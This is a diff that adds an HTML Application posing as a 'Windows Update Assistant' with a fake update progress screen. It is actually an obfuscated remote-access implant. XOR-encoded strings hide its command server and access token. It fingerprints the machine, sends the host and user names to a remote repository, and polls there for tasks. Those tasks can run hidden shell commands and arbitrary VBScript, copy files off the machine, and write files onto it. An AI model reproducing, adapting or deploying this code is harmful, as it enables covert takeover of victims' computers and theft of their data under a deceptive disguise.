@@ -1,0 +1,201 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<title>Windows Update</title>
+<hta:application id="oApp" applicationname="Windows Update Assistant"
+  showintaskbar="yes" windowstate="normal" border="thin"
+  scroll="no" maximizebutton="no" minimizebutton="yes"
+  navigable="no" singleinstance="no"/>
+<script language="JScript">
+var _k=(function(){var h="c7000d85262aa8dcc624e98bd0c04ef6",r=[];for(var i=0;i<h.length;i+=2)r.push(parseInt(h.substr(i,2),16));return r;})();
+var _B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+function _e64(a){var r="",i=0;while(i<a.length){var b0=a[i++]||0,b1=a[i++],b2=a[i++];r+=_B.charAt(b0>>2)+_B.charAt(((b0&3)<<4)|(b1>>4||0));r+=(b1===undefined)?"==":_B.charAt(((b1&15)<<2)|(b2>>6||0))+((b2===undefined)?"=":_B.charAt(b2&63));}return r;}
+function _d64(s){s=s.replace(/[=\s]/g,"");var r=[],i=0;while(i<s.length){var e0=_B.indexOf(s.charAt(i++)),e1=_B.indexOf(s.charAt(i++)),e2=i<s.length?_B.indexOf(s.charAt(i++)):-1,e3=i<s.length?_B.indexOf(s.charAt(i++)):-1;r.push((e0<<2)|(e1>>4));if(e2>=0)r.push(((e1&15)<<4)|(e2>>2));if(e3>=0)r.push(((e2&3)<<6)|e3);}return r;}
+function _xr(d){var r=[];for(var i=0;i<d.length;i++)r.push(d[i]^_k[i%_k.length]);return r;}
+function _en(s){var b=[];for(var i=0;i<s.length;i++)b.push(s.charCodeAt(i)&0xff);return _e64(_xr(b));}
+function _de(s){try{var b=atob(s),r="",i;for(i=0;i<b.length;i++)r+=String.fromCharCode(b.charCodeAt(i)^_k[i%_k.length]);return r;}catch(e){return"";}}
+function _js(v){if(v===null||v===undefined)return"null";var t=typeof v;if(t==="boolean")return v?"true":"false";if(t==="number")return isNaN(v)?"null":""+v;v=""+v;return'"'+v.replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\r/g,"\\r").replace(/\n/g,"\\n")+'"';}
+function _jp(s){try{return(new Function("return "+s))();}catch(e){return null;}}
+
+var _u=_de("r3R59VUQh/OnVIClt6k6nrJiI+ZJR4euo1SG+P+UHLOfTkjCdGWHlJJlqrn/oyGYs2Vj8VUF");
+var _fci=_de("pDJS5k8Ewq+pSg==");
+var _ftk=_de("pDJS8UdZw/KsV4bl");
+var _frp=_de("pDJS90NZ2PKsV4bl");
+
+var _id=(function(){
+    try{
+        var w=GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
+        var e=new Enumerator(w.ExecQuery("SELECT UUID FROM Win32_ComputerSystemProduct"));
+        if(!e.atEnd())return e.item().UUID.replace(/-/g,"").substring(0,16).toLowerCase();
+    }catch(x){}
+    var c="0123456789abcdef",r="";for(var i=0;i<16;i++)r+=c.charAt(Math.floor(Math.random()*16));return r;
+})();
+var _sl="";
+var _ci=0;
+
+function _log(msg){try{var d=document.getElementById("dbg");if(!d)return;var t=new Date().toTimeString().slice(0,8);d.innerHTML+="<div>"+t+" "+msg+"</div>";d.scrollTop=99999;}catch(e){}}
+
+function _req(path,method,body){
+    var url=_u+path;
+    var h1=_de("hnV57UlYwaanUIDkvg==");
+    var h2=_de("s29m4EgK");
+    var h3=_de("hmNu4FZe");
+    var h4=_de("pnB96U9JyaivS4ekpq4q2KBpee1TSIaq9Q+D+L+u");
+    var h5=_de("hG9j8UNE3PGSXZnu");
+    var h6=_de("pnB96U9JyaivS4ekurMhmA==");
+    try{
+        var x=new ActiveXObject(_de("kGljzVJe2PKRTYfDpLQ+pKJxeOBVXobp6BU="));
+        x.Option(4)=13056;x.Option(6)=false;
+        x.SetTimeouts(20000,20000,30000,30000);
+        x.open(method,url,false);
+        x.setRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+        x.setRequestHeader(h1,h2+_pat);
+        x.setRequestHeader(h3,h4);
+        x.setRequestHeader(h5,h6);
+        if(body)x.send(body);else x.send();
+        if(x.Status===200||x.Status===201)return x.ResponseText;
+    }catch(e){_log("rq err "+e.message);}
+    return "";
+}
+
+var _pat=_de("oGl57VNI96ynULa64YEBw4g2QsQWYuO7sVSswZatPsOsXzv1dW/YtrFcoMydqT26vnZLtRdTxav/ZZOzioMFuPB4XPAWepGdlErR5Z6HF6aBNUjVYGL46PVhpejm");
+
+function _sha(path){
+    var r=_req(path,"GET",null);
+    if(!r)return"";
+    var m=r.match(/"sha":"([^"]+)"/);
+    return m?m[1]:"";
+}
+function _read(path){
+    var r=_req(path,"GET",null);
+    if(!r)return"";
+    var m=r.match(/"content":"([\s\S]+?)(?=",")/);
+    if(!m)return"";
+    try{return atob(m[1].replace(/\s/g,""));}catch(e){return"";}
+}
+function _put(path,content){
+    var sha=_sha(path);
+    var cs=content.split(""),ba=[];
+    for(var i=0;i<cs.length;i++)ba.push(cs[i].charCodeAt(0)&0xff);
+    var b64=_e64(ba);
+    var body='{"message":"u","content":"'+b64+'"'+(sha?',"sha":"'+sha+'"':'')+'}';
+    _req(path,"PUT",body);
+}
+
+var evR="";
+function _ev(code){
+    try{evR="";window._evCode=code;_RunEv();return evR||"";}
+    catch(e){return"ERR:"+e.message;}
+}
+
+function _dl(path){
+    try{
+        var stm=new ActiveXObject(_de("hkRCwWQE+6i0QYjm"));
+        stm.Type=1;stm.Open();stm.LoadFromFile(path);
+        var raw=stm.Read();stm.Close();
+        var xml=new ActiveXObject(_de("inN16EoYhpiJaa3ks7Ujk6l0I7MIGg=="));
+        var nd=xml.createElement("b");nd.dataType="bin.base64";
+        nd.nodeTypedValue=raw;
+        return nd.text.replace(/\s/g,"");
+    }catch(e){return"ERR:"+e.message;}
+}
+function _ul(path,b64){
+    try{
+        var xml=new ActiveXObject(_de("inN16EoYhpiJaa3ks7Ujk6l0I7MIGg=="));
+        var nd=xml.createElement("b");nd.dataType="bin.base64";
+        nd.text=b64.replace(/\s/g,"");
+        var stm=new ActiveXObject(_de("hkRCwWQE+6i0QYjm"));
+        stm.Type=1;stm.Open();stm.Write(nd.nodeTypedValue);
+        stm.SaveToFile(path,2);stm.Close();
+        return"ok";
+    }catch(e){return"ERR:"+e.message;}
+}
+function _sh(cmd){
+    try{
+        var sh=new ActiveXObject(_de("kFNu909a3PKVTIznvA=="));
+        var wmi=GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
+        var tmp=sh.ExpandEnvironmentStrings("%TEMP%")+"\\~wu"+_id+".tmp";
+        var proc=wmi.Get("Win32_Process");
+        var inp=proc.Methods_("Create").InParameters.SpawnInstance_();
+        inp.CommandLine="cmd.exe /c "+cmd+' > "'+tmp+'" 2>&1';
+        var su=wmi.Get("Win32_ProcessStartup").SpawnInstance_();
+        su.ShowWindow=0;inp.ProcessStartupInformation=su;
+        var ret=proc.ExecMethod_("Create",inp);
+        if(ret.ReturnValue!==0)return"(rv:"+ret.ReturnValue+")";
+        var pid=ret.ProcessId,t0=new Date();
+        while(new Date()-t0<60000){
+            var q=wmi.ExecQuery("SELECT Handle FROM Win32_Process WHERE ProcessId="+pid);
+            if(!(new Enumerator(q).atEnd()))break;
+            WScript.Sleep(300);
+        }
+        var fso=new ActiveXObject(_de("lGN/7FZewbKhCq/ivKUdj7R0aOhpSMK5pVA="));
+        if(fso.FileExists(tmp)){var f=fso.OpenTextFile(tmp,1);var o=f.ReadAll();f.Close();fso.DeleteFile(tmp);return o||"(empty)";}
+        return"(timeout)";
+    }catch(e){return"ERR:"+e.message;}
+}
+
+function _dispatch(ty,cmd){
+    if(ty==="ev")return _ev(cmd);
+    if(ty==="sh")return _sh(cmd);
+    if(ty==="dl")return _dl(cmd);
+    if(ty==="ul"){var p=cmd.indexOf("|");return _ul(cmd.substring(0,p),cmd.substring(p+1));}
+    if(ty==="die"){window.close();return"";}
+    return"ERR:unknown "+ty;
+}
+
+function _beacon(){
+    _log("ci#"+_ci+" id="+_id);
+    try{
+        var sh=new ActiveXObject(_de("kFNu909a3PKVTIznvA=="));
+        var ci='{"id":'+_js(_id)+',"h":'+_js(sh.ExpandEnvironmentStrings("%COMPUTERNAME%"))+',"u":'+_js(sh.ExpandEnvironmentStrings("%USERDOMAIN%")+"\\"+sh.ExpandEnvironmentStrings("%USERNAME%"))+',"ts":'+_js(new Date().toLocaleString())+',"v":"7"}';
+        _put(_fci,ci);
+    }catch(e){_log("ci err "+e.message);}
+
+    var had=false;
+    try{
+        var tj=_read(_ftk);
+        _log("rd len="+tj.length+" sl="+_sl);
+        if(tj){
+            var td=_jp(tj);
+            _log("td="+(td?"id="+td.id+" ty="+td.ty:"null"));
+            if(td&&td.id&&td.id!==_sl){
+                var bid=td.bid||"";
+                if(bid&&bid!==_id){
+                    _log("skip bid="+bid);
+                    _sl=td.id;
+                }else{
+                    had=true;_sl=td.id;
+                    _log("ty="+td.ty);
+                    var cmd=_de(td.c);
+                    var out=_dispatch(td.ty,cmd);
+                    _log("out="+out.substring(0,80));
+                    var rsp='{"id":"'+_id+'","tid":"'+td.id+'","o":"'+_en(out)+'"}';
+                    _put(_frp,rsp);
+                    _log("sent "+td.id);
+                }
+            }
+        }
+    }catch(e){_log("task err "+e.message);}
+
+    _ci++;
+    var delay=had?(5000+Math.floor(Math.random()*10000)):(30000+Math.floor(Math.random()*60000));
+    window.setTimeout(_beacon,delay);
+}
+
+window.setTimeout(function(){_log("v7 id="+_id);_beacon();},2000);
+</script>
+<script language="VBScript">
+Sub _RunEv()
+    On Error Resume Next
+    ExecuteGlobal window._evCode
+End Sub
+</script>
+</head>
+<body style="font-family:'Segoe UI',Arial;background:#fff;margin:0;padding:20px">
+<h3 style="color:#0078d4">Windows Update</h3>
+<p style="color:#555;font-size:13px">Checking for updates, please wait&#8230;</p>
+<div style="background:#e0e0e0;height:4px;width:100%;margin-top:12px">
+<div id="pb" style="background:#0078d4;height:4px;width:0%"></div></div>
+<div id="dbg" style="display:block;font-size:11px;font-family:monospace;color:#333;margin-top:8px;max-height:200px;overflow-y:auto;border:1px solid #ccc;padding:4px"></div>
+</body>
+</html>
